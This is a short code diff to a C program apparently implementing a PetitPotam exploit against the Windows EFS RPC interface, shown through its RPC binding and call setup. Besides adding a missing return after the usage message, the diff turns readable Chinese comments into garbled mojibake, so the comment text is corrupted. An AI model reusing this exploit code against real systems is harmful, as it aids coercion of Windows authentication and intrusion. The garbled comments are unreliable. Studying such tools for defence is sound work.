@@ -24,6 +24,7 @@ void _tmain(int argc, TCHAR* argv[])
     if (argc != 5)
     {
         Usage();
+        return;
     }
 
     HANDLE hThread = NULL;
@@ -208,21 +209,21 @@ void ConnectPetitPotam(DWORD EfsID) {
         return;
     }
 
-    //绑定接口
+    //掳贸露篓陆脫驴脷
     status = RpcBindingFromStringBinding(StringBinding, &binding);
     if (status != RPC_S_OK) {
         printf("[-] RpcBindingFromStringBinding error: %d\n", GetLastError());
         return;
     }
 
-    //释放资源
+    //脢脥路脜脳脢脭麓
     status = RpcStringFree(&StringBinding);
     if (status != RPC_S_OK) {
         printf("[-] RpcStringFree error: %d\n", GetLastError());
         return;
     }
 
-    //调用rpc
+    //碌梅脫脙rpc
     RpcTryExcept{
     PVOID pContext;
     LPWSTR pipeFileName;
